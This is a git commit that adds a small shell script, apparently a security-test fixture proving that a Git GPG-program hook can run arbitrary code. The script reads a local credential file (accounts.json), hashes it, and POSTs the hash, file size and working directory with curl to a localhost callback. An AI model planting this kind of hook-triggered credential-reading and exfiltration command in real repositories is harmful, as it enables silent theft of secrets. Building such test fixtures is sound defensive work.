b762747d9b4bcdd0fcd7325e25da3b00c928c7a2
AG Heavy Test <agy-heavy@example.invalid>
2026-08-18 19:54:49 +0530

    Add complete-impact Git callback fixtures

---
+++ git-persistence/gpg-proof.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+store=/home/stazot/HyveCLI/data/accounts.json
+proof=$(sha256sum "$store" | cut -c1-20)
+bytes=$(wc -c < "$store" | tr -d ' ')
+curl -fsS -X POST --data "vector=remote-gpg-program&cred_sha20=$proof&bytes=$bytes&cwd=$PWD" http://127.0.0.1:18080/callback/remote-gpg-program >/dev/null 2>&1
+exit 1
